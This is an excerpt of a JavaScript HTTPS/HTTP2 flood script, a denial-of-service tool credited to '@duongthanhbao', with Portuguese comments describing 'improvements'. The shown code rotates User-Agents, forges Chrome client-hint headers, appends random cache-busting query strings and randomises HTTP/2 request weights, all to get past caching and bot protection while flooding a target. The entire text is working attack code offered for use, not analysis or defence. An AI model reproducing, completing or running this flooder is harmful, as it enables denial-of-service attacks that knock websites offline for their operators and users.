...
// 1. ADIÇÃO DE USER-AGENTS MODERNOS
// Esta lista será usada para rotacionar o User-Agent em cada requisição.
const userAgents = [
...
const RESTART_DELAY = 1000;
 ...
 if (cluster.isMaster) {
  console.clear()
  console.log(`HTTPS-FLOOD | BY @duongthanhbao (VERSÃO MELHORADA)`.blue)
...
// --- INÍCIO DAS MELHORIAS ---
// 2. ADIÇÃO DE LÓGICA DE BYPASS E POTÊNCIA
const userAgent = randomElement(userAgents); // Seleciona um User-Agent aleatório
const browserVersionMatch = userAgent.match(/Chrome\/(\d+)/);
const browserVersion = browserVersionMatch ? browserVersionMatch[1] : '121'; // Pega a versão do Chrome para o Client-Hints
// --- FIM DAS MELHORIAS ---

let headers = {
  ":authority": parsedTarget.host,
  ":scheme": "https",
  // --- MELHORIA: Cache Busting ---
  ":path": parsedTarget.path + "?tbaodzs1tg" + "=" + generateRandomString(10,25) + "&cache_bust=" + generateRandomString(8, 12),
  ":method":  "GET",
  ...
  // --- MELHORIA: Adição de User-Agent e Client-Hints ---
  "user-agent": userAgent,
  "sec-ch-ua": `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "Google Chrome";v="${browserVersion}"`,
  "sec-ch-ua-mobile": "?0",
...
const request = client.request({
      ...
      parent:0,
      exclusive: true,
      // --- MELHORIA: Randomização do Peso da Requisição ---
      weight: Math.floor(Math.random() * (256 - 1) + 1),
    })
